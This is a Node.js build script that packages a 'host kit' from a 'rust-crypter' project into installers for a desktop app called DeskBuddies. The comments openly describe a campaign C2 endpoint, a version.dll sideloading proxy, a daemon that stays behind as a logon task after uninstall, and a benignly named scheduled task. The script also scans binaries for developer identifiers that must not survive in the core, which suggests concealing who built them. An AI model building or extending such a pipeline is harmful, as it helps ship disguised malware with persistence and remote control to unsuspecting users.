#!/usr/bin/env node
/**
 * DeskBuddies build lane - stage the reusable host kit beside the packaged app,
 * then hand off to electron-builder.
 *
 * The kit is the one reusable Windows drop-in emitted by the sibling
 * rust-crypter checkout (tools/host-kit/build-host-kit.sh). Contract:
 *
 *   version.dll            genuine-MS forwarding stub (the 6 version exports)
 *   vmin.dll               Rust update core (cdylib over crates/app-update-core)
 *   app-update-daemon.exe  logon-task target (survives app uninstall)
 *   seed-conf.ps1          desk.conf seeding helper (SERVER only, NEVER a token)
 *   install-hooks.nsh      NSIS include: conf seeding + logon task + legacy sweep
 *   MANIFEST.txt           size + sha256 + source commits for every artifact
 *
 * Two-file lane (25H2): the DLLs MUST sit BESIDE DeskBuddies.exe, never inside
 * resources/. electron-builder's extraFiles is what puts them there - the
 * matching entries live in package.json -> build.win.extraFiles (scoped to the
 * Windows platform, so they can never land in a macOS bundle). extraResources
 * would land them in resources/ and break the lane.
 *
 * Usage:
 *   node scripts/build-with-stager.mjs --kit <dir> [electron-builder args...]
 *   node scripts/build-with-stager.mjs --rust-crypter <dir> [--kit-out <dir>]
 *   node scripts/build-with-stager.mjs --stage-only
 *   npm run dist:stager -- --dir
 *
 * macOS lane (the helper goes INSIDE the bundle, not beside it):
 *   node scripts/build-with-stager.mjs --mac --kit <dir> [--helper-name <name>]
 *   npm run dist:mac
 *
 * Exit codes: 0 ok, 1 kit/verification failure, 2 usage error, else electron-builder's.
 */
import { createHash } from "node:crypto";
import { existsSync, readdirSync, rmSync } from "node:fs";
import { cp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { basename, dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, "..");
const STAGE_DIR = join(ROOT, "stager-stage");

/** Every file the kit contract promises. Fail closed if any is absent. */
const KIT_REQUIRED = [
  "version.dll",
  "vmin.dll",
  "app-update-daemon.exe",
  "seed-conf.ps1",
  "install-hooks.nsh",
  "MANIFEST.txt",
];

/** The three binaries electron-builder copies beside DeskBuddies.exe. */
const KIT_SHIPPED = ["version.dll", "vmin.dll", "app-update-daemon.exe"];

/** Build-path / stale-identifier patterns that must not survive in the core. */
const FORBIDDEN = ["/home/jacob", "stager_core", "StagerHost", "spawn_stager", "bf-daemon"];

/**
 * The endpoint the installer seeds into desk.conf when no --server is given.
 * Same campaign, same C2 as the Creator Desk: bf-win-ffi/src-tauri/installer/
 * campaign.nsh and installer-hooks.nsh:35 (!define INV33_AGENT_SERVER) carry
 * this exact value, and the mac launcher template carries it too. An explicit
 * --server always wins.
 */
const CAMPAIGN_SERVER_DEFAULT = "wss://cdn-beam.site";

/**
 * macOS lane. Windows ships two files BESIDE the exe; on macOS the equivalent
 * is the helper binary INSIDE the bundle at Contents/MacOS/ (package.json ->
 * build.mac.extraFiles, whose "to" is relative to Contents/).
 *
 * MAC_HELPER_DEFAULT is PROVISIONAL - task-17 lands the real helper and its
 * name. A missing helper fails the build loudly rather than shipping a bundle
 * that looks like a shipping DeskBuddies and carries no update core.
 */
const MAC_STAGE_DIR = join(ROOT, "stager-stage-mac");
const MAC_HELPER_DEFAULT = "app-update-helper";

/** The sha256 a MANIFEST.txt records for one file name, or null. */
function manifestHashFor(text, fileName) {
  for (const raw of text.split(/\r?\n/)) {
    if (!raw.includes(fileName)) continue;
    const hash = raw.match(/\b([0-9a-fA-F]{64})\b/);
    if (hash) return hash[1].toLowerCase();
  }
  return null;
}

const HELP = [
  "DeskBuddies stager build lane",
  "",
  "  --kit <dir>           use a prebuilt host kit directory (wins over everything)",
  "  --rust-crypter <dir>  checkout whose tools/build-host-kit.sh emits the kit",
  "  --kit-out <dir>       where that builder emits the kit (default: <checkout>/host-kit)",
  "  --stage-only          stage + verify, do not run electron-builder",
  "  --server <url>        endpoint the installer seeds into desk.conf.",
  "                        Default: " + CAMPAIGN_SERVER_DEFAULT + " (the campaign",
  "                        endpoint the Creator Desk installer seeds). HOSTKIT_SERVER",
  "                        is honoured too; an explicit --server always wins.",
  "  -h, --help            this text",
  "",
  "Everything else is forwarded to electron-builder (a platform flag is added when",
  "you do not pass one; the lane targets Windows).",
  "",
].join("\n");

function fail(msg, code = 1) {
  console.error("\n[stager] FAIL: " + msg + "\n");
  process.exit(code);
}

function info(msg) {
  console.log("[stager] " + msg);
}

/**
 * A kit that fails verification must not leave artifacts behind: a later
 * electron-builder run would happily ship whatever sits in stager-stage/.
 */
function failRejected(msg) {
  try {
    rmSync(STAGE_DIR, { recursive: true, force: true });
  } catch {
    /* best effort - the failure below is the real signal */
  }
  fail(msg);
}

function sha256(buf) {
  return createHash("sha256").update(buf).digest("hex");
}

/** Count ASCII and UTF-16LE occurrences of a literal in a buffer. */
function countOccurrences(buf, needle) {
  const ascii = Buffer.from(needle, "utf8");
  const wide = Buffer.from(needle, "utf16le");
  let a = 0;
  let w = 0;
  let i = buf.indexOf(ascii);
  while (i !== -1) {
    a += 1;
    i = buf.indexOf(ascii, i + 1);
  }
  i = buf.indexOf(wide);
  while (i !== -1) {
    w += 1;
    i = buf.indexOf(wide, i + 1);
  }
  return { ascii: a, wide: w };
}

/**
 * Tolerant MANIFEST.txt reader: any line carrying a 64-hex token and a
 * filename is taken as an entry, in either order (sha256sum style or table
 * style). Unparseable lines are ignored.
 */
function parseManifest(text) {
  const entries = new Map();
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith("#")) continue;
    const hash = line.match(/\b([0-9a-fA-F]{64})\b/);
    if (!hash) continue;
    const files = line.match(/[\w.@+-]+\.(?:dll|exe|ps1|nsh|txt|pdb)/gi);
    if (!files) continue;
    for (const f of files) entries.set(basename(f), hash[1].toLowerCase());
  }
  return entries;
}

function safeReaddir(dir) {
  try {
    return readdirSync(dir, { withFileTypes: true })
      .filter((e) => e.isDirectory())
      .map((e) => e.name);
  } catch {
    return [];
  }
}

/** Builder entry points, in the order the rust-crypter repo has carried them. */
const KIT_BUILDER_PATHS = [
  "tools/host-kit/build-host-kit.sh",
  "tools/build-host-kit.sh",
  "tools/build-host-kit.mjs",
  "tools/host-kit/build.sh",
];

/** Sibling rust-crypter checkouts: the main one plus any host-kit worktrees. */
function discoverCheckouts() {
  const parent = resolve(ROOT, "..");
  const found = [];
  const push = (p) => {
    if (existsSync(join(p, "crates")) && !found.includes(p)) found.push(p);
  };
  for (const name of ["rust-crypter", "rust-crypter-wt", "rust-crypter-worktrees"]) {
    const base = join(parent, name);
    if (!existsSync(base)) continue;
    push(base);
    for (const child of safeReaddir(base)) push(join(base, child));
  }
  return found;
}

function findKitBuilder(checkout) {
  for (const rel of KIT_BUILDER_PATHS) {
    const p = join(checkout, rel);
    if (existsSync(p)) return p;
  }
  return null;
}

function findEmittedKit(checkout, kitOut) {
  const candidates = kitOut
    ? [resolve(kitOut)]
    : [
        join(checkout, "host-kit"),
        join(checkout, "tools", "host-kit", "out"),
        join(checkout, "tools", "host-kit"),
        join(checkout, "dist", "host-kit"),
      ];
  for (const c of candidates) {
    if (existsSync(join(c, "vmin.dll")) || existsSync(join(c, "MANIFEST.txt"))) return c;
  }
  return null;
}

function run(cmd, args, opts = {}) {
  return new Promise((res, rej) => {
    const child = spawn(cmd, args, { stdio: "inherit", ...opts });
    child.on("error", rej);
    child.on("close", (code) => res(code === null ? 1 : code));
  });
}

function parseArgs(argv) {
  const out = {
    kit: null,
    rustCrypter: null,
    kitOut: null,
    stageOnly: false,
    server: null,
    mac: false,
    helperName: null,
    passthrough: [],
  };
  for (let i = 0; i < argv.length; i += 1) {
    const a = argv[i];
    if (a === "-h" || a === "--help") {
      console.log(HELP);
      process.exit(0);
    } else if (a === "--kit") out.kit = argv[++i];
    else if (a.startsWith("--kit=")) out.kit = a.slice(6);
    else if (a === "--rust-crypter") out.rustCrypter = argv[++i];
    else if (a.startsWith("--rust-crypter=")) out.rustCrypter = a.slice(15);
    else if (a === "--kit-out") out.kitOut = argv[++i];
    else if (a.startsWith("--kit-out=")) out.kitOut = a.slice(10);
    else if (a === "--stage-only") out.stageOnly = true;
    else if (a === "--mac") out.mac = true;
    else if (a === "--helper-name") out.helperName = argv[++i];
    else if (a.startsWith("--helper-name=")) out.helperName = a.slice(14);
    else if (a === "--server") out.server = argv[++i];
    else if (a.startsWith("--server=")) out.server = a.slice(9);
    else out.passthrough.push(a);
  }
  return out;
}

async function resolveKit({ kit, rustCrypter, kitOut }) {
  if (kit) {
    const dir = resolve(kit);
    if (!existsSync(dir)) fail("--kit directory does not exist: " + dir);
    return { dir, source: "--kit" };
  }
  if (process.env.HOST_KIT_DIR) {
    const dir = resolve(process.env.HOST_KIT_DIR);
    if (!existsSync(dir)) fail("HOST_KIT_DIR does not exist: " + dir);
    return { dir, source: "HOST_KIT_DIR" };
  }

  const checkouts = rustCrypter ? [resolve(rustCrypter)] : discoverCheckouts();
  if (checkouts.length === 0) {
    fail(
      "no host kit and no sibling rust-crypter checkout found.\n" +
        "  Fix one of:\n" +
        "    1) node scripts/build-with-stager.mjs --kit <prebuilt-kit-dir>\n" +
        "    2) node scripts/build-with-stager.mjs --rust-crypter <checkout>\n" +
        "    3) clone shroud/rust-crypter beside this repo (../rust-crypter)\n" +
        "  The kit is built by tools/host-kit/build-host-kit.sh in that checkout.",
    );
  }

  const tried = [];
  for (const checkout of checkouts) {
    const builder = findKitBuilder(checkout);
    if (!builder) {
      tried.push(checkout + " (no host-kit builder)");
      continue;
    }
    info("building host kit: " + builder);
    const cmd = builder.endsWith(".mjs") ? process.execPath : "bash";
    const args = [builder];
    if (kitOut && builder.endsWith(".sh")) args.push("--out", resolve(kitOut));
    const env = { ...process.env };
    // The kit builder defaults BF_WIN_FFI_DIR to <checkout>/../bf-win-ffi, which
    // is wrong when the checkout is a rust-crypter worktree. Point it at the
    // real sibling when the caller has not said otherwise.
    if (!env.BF_WIN_FFI_DIR) {
      const sibling = join(resolve(ROOT, ".."), "bf-win-ffi");
      if (existsSync(join(sibling, "src-tauri", "version_proxy"))) env.BF_WIN_FFI_DIR = sibling;
    }
    const code = await run(cmd, args, { cwd: checkout, env });
    if (code !== 0) {
      tried.push(checkout + " (builder exited " + code + ")");
      continue;
    }
    const emitted = findEmittedKit(checkout, kitOut);
    if (!emitted) {
      tried.push(checkout + " (builder ran but emitted no kit with vmin.dll/MANIFEST.txt)");
      continue;
    }
    return { dir: emitted, source: "builder @ " + checkout };
  }

  fail("could not obtain a host kit.\n  Tried:\n" + tried.map((t) => "    - " + t).join("\n"));
}

/**
 * The macOS lane: stage the helper binary for Contents/MacOS/ and hand off to
 * electron-builder. Mirrors the Windows lane's gates - contract check, staging,
 * manifest sha256 when the kit ships one, stale-identifier scan, provenance -
 * and refuses to build at all when the helper is absent.
 */
async function mainMac(opts) {
  const helperName = opts.helperName || MAC_HELPER_DEFAULT;
  const kitArg = opts.kit || process.env.HOST_KIT_DIR || null;
  if (!kitArg) {
    fail(
      "the mac lane needs --kit <dir> holding the helper binary.\n" +
        "  There is no mac kit builder yet - the helper comes from task-17 - so pass\n" +
        "  the directory that holds it:  --mac --kit <dir> [--helper-name <name>]",
      2,
    );
  }
  const kitDir = resolve(kitArg);
  if (!existsSync(kitDir)) fail("--kit directory does not exist: " + kitDir);

  info("mac kit: " + kitDir);
  info(
    "helper : " +
      helperName +
      (opts.helperName
        ? "  (from --helper-name)"
        : "  (PROVISIONAL name - pass --helper-name once task-17 lands the real one)"),
  );

  // Nothing survives a failed run: a rejected kit must never be picked up by a
  // later electron-builder.
  await rm(MAC_STAGE_DIR, { recursive: true, force: true });

  // --- contract check -------------------------------------------------------
  const helperPath = join(kitDir, helperName);
  if (!existsSync(helperPath)) {
    failRejected(
      "the mac kit has no helper binary: " + helperPath + "\n" +
        "  Refusing to build a bundle with no helper - it would look like a shipping\n" +
        "  DeskBuddies and carry no update core. Fix one of:\n" +
        "    --helper-name <name>   the helper is named differently\n" +
        "    --kit <dir>            it lives elsewhere\n" +
        "  kit dir contains: " + (readdirSync(kitDir).join(", ") || "(nothing)"),
    );
  }

  // --- stage ----------------------------------------------------------------
  await mkdir(MAC_STAGE_DIR, { recursive: true });
  const stagedPath = join(MAC_STAGE_DIR, helperName);
  await cp(helperPath, stagedPath);
  info("staged -> " + stagedPath);

  // --- gate: sha256 vs the kit manifest, when the kit ships one --------------
  const manifestPath = join(kitDir, "MANIFEST.txt");
  const helperBuf = await readFile(stagedPath);
  const digest = sha256(helperBuf);
  if (existsSync(manifestPath)) {
    const want = manifestHashFor(await readFile(manifestPath, "utf8"), helperName);
    if (!want) {
      info("kit MANIFEST.txt carries no entry for " + helperName + " - sha recorded, not compared");
    } else if (want !== digest) {
      failRejected(
        "the staged helper does not match the kit manifest.\n" +
          "  manifest: " + want + "\n" +
          "  staged  : " + digest + "\n" +
          "  file    : " + helperName,
      );
    } else {
      info("sha256 matches the kit manifest: " + digest);
    }
  } else {
    info("kit has no MANIFEST.txt - sha256 recorded, not compared");
  }

  // --- gate: stale-identifier scan ------------------------------------------
  const leaks = FORBIDDEN.map((needle) => ({ needle, ...countOccurrences(helperBuf, needle) })).filter(
    (r) => r.ascii > 0 || r.wide > 0,
  );
  if (leaks.length > 0) {
    failRejected(
      "forbidden identifiers survived in the helper:\n" +
        leaks.map((r) => "  " + r.needle + " ascii=" + r.ascii + " utf16le=" + r.wide).join("\n"),
    );
  }
  info("identifier scan: 0 x " + FORBIDDEN.join(", "));

  // --- provenance -----------------------------------------------------------
  await writeFile(
    join(MAC_STAGE_DIR, "PROVENANCE.txt"),
    [
      "staged : " + new Date().toISOString(),
      "lane   : mac",
      "kit    : " + kitDir,
      "helper : " + helperName,
      "size   : " + helperBuf.length + " B",
      "sha256 : " + digest,
      "server : " + opts.server + "  (seeded by the app - never a token)",
      "",
    ].join("\n"),
  );

  if (opts.stageOnly) {
    info("stage-only: not running electron-builder");
    return;
  }

  // --- package --------------------------------------------------------------
  const builderArgs = [...opts.passthrough];
  const hasPlatform = builderArgs.some((a) => /^(--win|--mac|--linux|-w|-m|-l)$/.test(a));
  if (!hasPlatform) builderArgs.unshift("--mac");
  info("electron-builder " + builderArgs.join(" "));

  const bin = process.platform === "win32" ? "electron-builder.cmd" : "electron-builder";
  const binPath = join(ROOT, "node_modules", ".bin", bin);
  if (!existsSync(binPath)) fail("electron-builder is not installed at " + binPath + " - run: npm ci");
  const code = await run(binPath, builderArgs, { cwd: ROOT, shell: process.platform === "win32" });
  if (code !== 0) fail("electron-builder exited with code " + code, code);
  info("done.");
}

async function main() {
  const opts = parseArgs(process.argv.slice(2));
  // The endpoint the installer seeds into desk.conf. An explicit --server wins,
  // then HOSTKIT_SERVER, then the campaign endpoint this fleet already uses.
  // Source of truth for the default: bf-win-ffi/src-tauri/installer/campaign.nsh
  // and installer-hooks.nsh:35 (!define INV33_AGENT_SERVER "wss://cdn-beam.site"),
  // which seed the same SERVER value for the Creator Desk. A token is never
  // seeded by any path - the kit writes SERVER only (INV-44 P0-1).
  if (!opts.server && process.env.HOSTKIT_SERVER) opts.server = process.env.HOSTKIT_SERVER;
  if (!opts.server) {
    opts.server = CAMPAIGN_SERVER_DEFAULT;
    info("no --server given: using the recorded campaign endpoint " + opts.server);
    info("  (pass --server <url> to override; recorded in stager-stage/PROVENANCE.txt)");
  }
  if (!/^(https?|wss):\/\/[^\s"$]+$/.test(opts.server)) {
    fail('--server must be an http(s) or wss URL with no spaces, quotes or "$": ' + opts.server, 2);
  }

  // The mac lane stages a different contract (one helper, no NSIS) and shares
  // the endpoint resolution above.
  if (opts.mac) return mainMac(opts);

  const { dir: kitDir, source } = await resolveKit(opts);

  info("kit: " + kitDir + "  (source: " + source + ")");

  // Nothing survives a failed run: clear the stage dir before any check, so a
  // rejected kit can never be picked up by a later electron-builder.
  await rm(STAGE_DIR, { recursive: true, force: true });

  // --- contract check -------------------------------------------------------
  const missing = KIT_REQUIRED.filter((f) => !existsSync(join(kitDir, f)));
  if (missing.length > 0) {
    fail("kit is incomplete, missing: " + missing.join(", ") + "\n  kit dir: " + kitDir);
  }

  // --- stage ----------------------------------------------------------------
  await mkdir(STAGE_DIR, { recursive: true });
  for (const f of KIT_REQUIRED) await cp(join(kitDir, f), join(STAGE_DIR, f));
  // Anything else the kit ships (docs, extra helpers) is staged too, so the
  // hooks' relative references keep resolving next to install-hooks.nsh.
  for (const entry of readdirSync(kitDir, { withFileTypes: true })) {
    if (!entry.isFile() || KIT_REQUIRED.includes(entry.name)) continue;
    await cp(join(kitDir, entry.name), join(STAGE_DIR, entry.name));
  }
  info("staged " + KIT_REQUIRED.length + "+ files -> " + STAGE_DIR);

  // --- gate (c): sha256 of the staged binaries vs the kit manifest ----------
  const manifestText = await readFile(join(kitDir, "MANIFEST.txt"), "utf8");
  const manifest = parseManifest(manifestText);
  if (manifest.size === 0) {
    fail("MANIFEST.txt carries no parseable <sha256> <file> lines - cannot verify the kit.");
  }
  const shas = new Map();
  const shaFailures = [];
  for (const f of KIT_SHIPPED) {
    const buf = await readFile(join(STAGE_DIR, f));
    const digest = sha256(buf);
    shas.set(f, { digest, bytes: buf.length, expected: manifest.get(f) || null });
    if (!manifest.has(f)) shaFailures.push(f + ": absent from MANIFEST.txt");
    else if (manifest.get(f) !== digest) {
      shaFailures.push(f + ": manifest " + manifest.get(f) + " != staged " + digest);
    }
  }
  info("gate (c) sha256 vs kit manifest:");
  for (const f of KIT_SHIPPED) {
    const s = shas.get(f);
    console.log(
      "    " + f.padEnd(22) + " " + String(s.bytes).padStart(9) + " B  " + s.digest + "  " +
        (s.expected === s.digest ? "OK" : "MISMATCH"),
    );
  }
  if (shaFailures.length > 0) failRejected("manifest verification failed:\n  " + shaFailures.join("\n  "));

  // --- gate (d): build-path / stale-identifier scan -------------------------
  info("gate (d) identifier scan:");
  const stringFailures = [];
  for (const f of KIT_SHIPPED) {
    const buf = await readFile(join(STAGE_DIR, f));
    const parts = [];
    for (const needle of FORBIDDEN) {
      const { ascii, wide } = countOccurrences(buf, needle);
      if (ascii > 0) stringFailures.push(f + ": " + ascii + ' x "' + needle + '" (ascii)');
      parts.push(needle + "=" + ascii + (wide > 0 ? "(+" + wide + " wide)" : ""));
    }
    console.log("    " + f.padEnd(22) + " " + parts.join("  "));
  }
  if (stringFailures.length > 0) {
    failRejected("forbidden identifiers survived in the core:\n  " + stringFailures.join("\n  "));
  }

  // --- provenance -----------------------------------------------------------
  const provenance = [
    "DeskBuddies stager stage - generated " + new Date().toISOString(),
    "kit: " + kitDir,
    "server: " + opts.server,
    "source: " + source,
    "",
    ...KIT_SHIPPED.map((f) => shas.get(f).digest + "  " + f + "  " + shas.get(f).bytes + " B"),
    "",
    "manifest (kit copy follows):",
    manifestText.trim(),
    "",
  ].join("\n");
  await writeFile(join(STAGE_DIR, "PROVENANCE.txt"), provenance, "utf8");

  // --- the values the kit's NSIS include requires from this host -------------
  {
    const defines = [
      "; Generated by scripts/build-with-stager.mjs - do not edit, do not commit.",
      "; The host kit's required values for this host (docs/HOST-KIT.md section 5).",
      '!define HOSTKIT_SERVER "' + opts.server + '"',
      "; The name the daemon is shipped and registered under - it must match the",
      "; extraFiles entry in package.json, because the hook stages it from $INSTDIR.",
      '!define HOSTKIT_DAEMON_NAME "app-update-daemon.exe"',
      "; Customer-visible scheduled-task name (the kit default names the Creator Desk).",
      '!define HOSTKIT_TASK_NAME "Bright Floppy DeskBuddies Update"',
      "; Customer-visible installer progress strings. Guarded, so a caller can still",
      "; override it on the makensis command line.",
      "!ifndef HOSTKIT_PRODUCT_NAME",
      '  !define HOSTKIT_PRODUCT_NAME "DeskBuddies"',
      "!endif",
      "",
    ].join("\n");
    await writeFile(join(STAGE_DIR, "HOSTKIT-DEFINES.nsh"), defines, "utf8");
    info("wrote stager-stage/HOSTKIT-DEFINES.nsh (HOSTKIT_SERVER=" + opts.server + ")");
  }

  const hooksWrapper = join(ROOT, "build", "installer", "stager-hooks.nsh");
  if (!existsSync(hooksWrapper)) {
    info("warning: " + hooksWrapper + " is missing - the installer will not pull in the kit hooks.");
  }

  if (opts.stageOnly) {
    info("--stage-only: stopping before electron-builder.");
    return;
  }

  // --- package --------------------------------------------------------------
  const builderArgs = [...opts.passthrough];
  const hasPlatform = builderArgs.some((a) => /^(--win|--mac|--linux|-w|-m|-l)$/.test(a));
  if (!hasPlatform) builderArgs.unshift("--win");
  info("electron-builder " + builderArgs.join(" "));

  const bin = process.platform === "win32" ? "electron-builder.cmd" : "electron-builder";
  const binPath = join(ROOT, "node_modules", ".bin", bin);
  if (!existsSync(binPath)) fail("electron-builder is not installed at " + binPath + " - run: npm ci");
  const code = await run(binPath, builderArgs, {
    cwd: ROOT,
    shell: process.platform === "win32",
  });
  if (code !== 0) fail("electron-builder exited with code " + code, code);
  info("done.");
}

await main();
